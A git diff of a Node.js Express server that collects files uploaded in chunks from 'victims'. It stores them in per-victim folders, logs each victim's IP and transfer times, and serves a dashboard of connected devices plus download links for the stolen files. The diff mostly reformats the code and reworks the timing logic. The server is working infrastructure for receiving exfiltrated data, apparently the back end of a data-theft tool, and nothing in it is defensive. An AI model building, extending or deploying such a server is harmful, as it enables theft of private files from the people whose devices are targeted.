@@ -5,9 +5,9 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080; // Railway or fallback port
+const PORT = process.env.PORT || 8080;
 
-// CORS settings
+// Enable CORS
 const corsOptions = {
     origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
     methods: ['GET', 'POST', 'OPTIONS'],
@@ -16,66 +16,57 @@ const corsOptions = {
 };
 app.use(cors(corsOptions));
 
-// Debug request logging
+// Request logging
 app.use((req, res, next) => {
     console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
     next();
 });
 
+// Handle preflight request for upload
 app.options('/upload', (req, res) => {
-    res.header('Access-Control-Allow-Origin', corsOptions.origin.join(', '));
+    res.header('Access-Control-Allow-Origin', corsOptions.origin);
     res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
     res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
     res.header('Access-Control-Allow-Credentials', 'true');
     res.status(204).end();
 });
 
+// Serve dashboard files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
-app.get('/dashboard/', (req, res) => res.sendFile(path.join(__dirname, 'dashboard', 'index.html')));
 
+app.get('/dashboard/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
+});
+
+// Handle raw binary upload
 app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
 const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
-if (!fs.existsSync(OUTPUT_BASE_DIR)) fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
+if (!fs.existsSync(OUTPUT_BASE_DIR)) {
+    fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
+}
 
+// Per-victim storage
 const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
-const victimFiles = {};
-const connectedDevices = {}; // Tracks connection time, files, upload times
-
+const connectedDevices = {};
 const chunkTracker = new Map();
 
-async function checkAndSendEmail(victimId, filename, victimFolder) {
+// Helper to check all files received (future email trigger)
+function checkAndSendEmail(victimId, victimFolder) {
     const filesInFolder = fs.readdirSync(victimFolder);
     if (filesInFolder.length === victimTotalFiles[victimId]) {
         console.log(`✅ All files received for victim ${victimId}`);
 
-        victimFiles[victimId] = filesInFolder.map((file) => {
-            const filePath = path.join(victimFolder, file);
-            const stats = fs.statSync(filePath);
-            return { name: file, type: path.extname(file).substring(1), size: stats.size };
-        });
+        const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
+        connectedDevices[victimId].totalUploadTime = (timeTaken / 1000).toFixed(2);
 
-        // Calculate and log per-file upload time
-        if (connectedDevices[victimId]?.fileTimers?.[filename]) {
-            const uploadDurationMs = Date.now() - connectedDevices[victimId].fileTimers[filename];
-            console.log(`⏱️ Transfer time for file ${filename}: ${(uploadDurationMs / 1000).toFixed(2)} seconds`);
-
-            // Optionally accumulate total time (all files combined)
-            connectedDevices[victimId].totalUploadDuration = (connectedDevices[victimId].totalUploadDuration || 0) + uploadDurationMs;
-
-            // Clear file-specific timer after processing
-            delete connectedDevices[victimId].fileTimers[filename];
-        }
-
-        // Optional: log total time for all files
-        if (filesInFolder.length === victimTotalFiles[victimId] && connectedDevices[victimId]?.totalUploadDuration) {
-            console.log(`📊 Total transfer time for all files (victim ${victimId}): ${(connectedDevices[victimId].totalUploadDuration / 1000).toFixed(2)} seconds`);
-        }
+        console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime} seconds`);
     }
 }
 
+// Upload endpoint
 app.post('/upload', (req, res) => {
     try {
         const filename = decodeURIComponent(req.headers['filename']);
@@ -90,25 +81,27 @@ app.post('/upload', (req, res) => {
 
         const chunkId = `${victimId}-${filename}-${chunkIndex}`;
 
-        if (!chunkTracker.has(chunkId)) chunkTracker.set(chunkId, new Set());
+        if (!chunkTracker.has(chunkId)) {
+            chunkTracker.set(chunkId, new Set());
+        }
+
         if (chunkTracker.get(chunkId).has(chunkIndex)) {
             console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
             return res.status(200).json({ message: 'Duplicate chunk skipped' });
         }
+
         chunkTracker.get(chunkId).add(chunkIndex);
 
         if (!connectedDevices[victimId]) {
             connectedDevices[victimId] = {
-                ip,
-                connectionTime: new Date(),
+                ip: ip,
+                connectionTime: Date.now(),
                 filesTransferred: 0,
                 fileList: [],
-                fileTimers: {}, // New: Tracks individual file timers
+                fileTimers: {},        // Start time per file
+                fileEndTimes: {},      // End time per file
+                fileDurations: {}      // Transfer time per file
             };
-        }
-
-        if (chunkIndex === 0 && !connectedDevices[victimId].fileTimers[filename]) {
-            connectedDevices[victimId].fileTimers[filename] = Date.now();
         }
 
         if (!victimFolders[victimId]) {
@@ -122,13 +115,16 @@ app.post('/upload', (req, res) => {
         const victimFolder = victimFolders[victimId];
         const filePath = path.join(victimFolder, filename);
 
+        if (chunkIndex === 0 && !connectedDevices[victimId].fileTimers[filename]) {
+            connectedDevices[victimId].fileTimers[filename] = Date.now();
+        }
+
         fs.appendFile(filePath, req.body, (err) => {
             if (err) {
                 console.error(`❌ Error writing file:`, err);
                 return res.status(500).json({ error: 'Error saving file' });
             }
 
-            console.log(`✅ Chunk ${chunkIndex + 1}/${totalChunks} received for ${filename}`);
             victimFileCounts[victimId] += 1;
             connectedDevices[victimId].filesTransferred += 1;
 
@@ -137,49 +133,57 @@ app.post('/upload', (req, res) => {
             }
 
             if (victimFileCounts[victimId] === totalChunks) {
-                console.log(`✅ File upload complete: ${filename}`);
-                checkAndSendEmail(victimId, filename, victimFolder);
+                const startTime = connectedDevices[victimId].fileTimers[filename];
+                const endTime = Date.now();
+                const duration = ((endTime - startTime) / 1000).toFixed(2);
+
+                connectedDevices[victimId].fileEndTimes[filename] = new Date(endTime).toISOString();
+                connectedDevices[victimId].fileDurations[filename] = duration;
+
+                console.log(`✅ File ${filename} received completely in ${duration} seconds`);
+
+                checkAndSendEmail(victimId, victimFolder);
             }
 
             res.status(200).json({ message: 'Chunk received successfully' });
         });
     } catch (error) {
-        console.error(`❌ Error handling upload:`, error);
+        console.error(`❌ Upload error:`, error);
         res.status(500).json({ error: 'Internal server error' });
     }
 });
 
+// Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
     res.json(connectedDevices);
 });
 
+// File download endpoint
 app.get('/download/:victimId/:filename', (req, res) => {
     try {
         const { victimId, filename } = req.params;
-
         if (!victimFolders[victimId]) {
             return res.status(404).json({ error: 'Victim folder not found' });
         }
 
-        const victimFolder = victimFolders[victimId];
-        const filePath = path.join(victimFolder, filename);
-
+        const filePath = path.join(victimFolders[victimId], filename);
         if (!fs.existsSync(filePath)) {
             return res.status(404).json({ error: 'File not found' });
         }
 
         res.download(filePath, filename, (err) => {
             if (err) {
-                console.error(`❌ Error sending file:`, err);
+                console.error(`❌ Download error:`, err);
                 res.status(500).json({ error: 'Error sending file' });
             }
         });
     } catch (error) {
-        console.error(`❌ Error in download route:`, error);
+        console.error(`❌ Download route error:`, error);
         res.status(500).json({ error: 'Internal server error' });
     }
 });
 
+// Start server
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
